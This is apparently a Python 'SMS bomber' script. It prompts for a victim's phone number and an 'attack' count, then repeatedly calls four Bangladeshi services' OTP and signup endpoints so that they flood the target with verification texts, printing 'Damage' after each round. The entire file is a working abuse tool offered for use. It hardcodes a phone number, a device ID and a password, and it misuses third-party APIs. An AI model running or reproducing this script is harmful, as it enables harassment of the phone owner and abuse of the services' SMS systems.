import requests
from requests.structures import CaseInsensitiveDict

green = '\033[1;32m'
end = '\033[0m'
print (green+"""  _______ _    _ _  _____                                         
 |__   __| |  | (_)/ ____|                                        
    | |  | |__| |_| (___                                          
    | |  |  __  | |\___ \                                         
    | |  | |  | | |____) |                                        
   _|_|_ |_|  |_|_|_____/____   __  __                            
  / ____|      / ____|__   __| |  \/  |                           
 | (___  _   _| (___    | | ___| \  / |                           
  \___ \| | | |\___ \   | |/ _ \ |\/| |                           
  ____) | |_| |____) |  | |  __/ |  | |                           
 |_____/ \__, |_____/___|_|\___|_|  |_|                           
  / ____| __/ |     |__   __|                                     
 | |     |___/___  __ _| | ___  _ __                              
 | |    | '__/ _ \/ _` | |/ _ \| '__|                             
 | |____| | |  __/ (_| | | (_) | |                                
  \_____|_|  \___|\__,_|_|\___/|_|                                
 |  _ \                                                           
 | |_) |_   _                                                     
 |  _ <| | | |                                                    
 | |_) | |_| |                                                    
 |____/ \__, |                                                    
         __/ |                                                    
   __  _|___/ _____         _____ _    _       _  ___ ____   __   
  / / | |  | |  __ \       / ____| |  | |     | |/ (_)  _ \  \ \  
 | |  | |__| | |  | |_____| (___ | |__| | __ _| ' / _| |_) |  | | 
 | |  |  __  | |  | |______\___ \|  __  |/ _` |  < | |  _ <   | | 
 | |  | |  | | |__| |      ____) | |  | | (_| | . \| | |_) |  | | 
 | |  |_|  |_|_____/      |_____/|_|  |_|\__,_|_|\_\_|____/   | | 
  \_\                                                        /_/  
                                                                  """+end)

# CVALUE
blue = '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan = "\033[96m"
end = '\033[0m'
print ("\033[32m")

print ("	 -!-!- WeLcOmE-!-!- ( HD-SHaKiiB ) ( GhOsToFKiinG ) ")


print ("""


   ╔═════════════════════════════════╗
   ║ AuTHor   : SHaKiiB ツ           ║
   ║ FaCeBooK : iTzSHaKiiB           ║
   ║ GitHuB   : iTzSHaKiB            ║
   ╚═════════════════════════════════╝




""")

number  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar aTTack NumBer DiN: "))


amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))


url1 = "https://api.meenaclick.com/api/front/sms/send/pin?cell_phone=8801612153912&type=sign-up"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/json"
headers1["Content-Length"] = "0"

url2 = "http://27.131.15.19/lstyle/api/lsotprequest"

headers2 = CaseInsensitiveDict()

headers2["Content-Length"]="48"

headers2["Content-Type"]="application/json"

data2 = """{
  \"shortcode\": \"2494905\",
  \"msisdn\": \"88"""+number+"""\"
}"""

url3 = "http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number

url4 = "https://www.mydrivebd.com/sapi/profile?action=signup&notify=true&rid=0.23183502639972242&validationkey=466429644f202f6120572a682b495374"

headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json;charset=UTF-8"
headers4["x-deviceid"] = "web-d881a3b625c9fbbcaa2ae2ac2c8bb061"

data4 = """{
  \"data\": {
    \"user\": {
      \"generic\": {
        \"userid\": \"88"""+number+"""\",
        \"password\": \"niilahmed281\",
        \"l10n\": \"en\",
        \"acceptedtermsandconditions\": true
      }
    }
  }
}"""



for i in range(amount):
	try:
		resp1 = requests.post(url1, headers=headers1)

		resp2 = requests.post(url2, headers=headers2, data=data2)

		resp3 = requests.get(url3)

		resp4 = requests.post(url4, headers=headers4,  data=data4)

		print(str (i+1)+" Damage \n")

	except:
		print ("Please Make Sure Your Internet Connection")